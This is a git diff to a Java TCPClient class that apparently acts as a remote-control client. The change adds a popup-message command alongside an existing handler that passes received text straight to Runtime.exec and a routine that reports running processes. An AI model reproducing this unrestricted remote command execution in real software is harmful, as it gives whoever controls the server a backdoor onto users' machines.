@@ -10,6 +10,8 @@ import java.util.Random;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import javax.swing.JOptionPane;
+
 import org.apache.commons.lang3.StringUtils;
 
 class TCPClient {
@@ -69,6 +71,11 @@ class TCPClient {
 			message = message.replace(System.getenv("computername")
 					+ " command ", "");
 			command(message);
+		} else if (message.contains(" popup ")
+				&& message.contains(System.getenv("computername"))) {
+			message = message.replace(
+					System.getenv("computername") + " popup ", "");
+			textPopup(message);
 		}
 	}
 
@@ -85,14 +92,18 @@ class TCPClient {
 		}
 	}
 
-	private static void command(String command){
+	private static void command(String command) {
 		try {
 			Runtime.getRuntime().exec(command);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
 	}
-	
+
+	private static void textPopup(String text) {
+		JOptionPane.showMessageDialog(null, text);
+	}
+
 	public static void sendProcesses() {
 		try {
 			String processes = "";
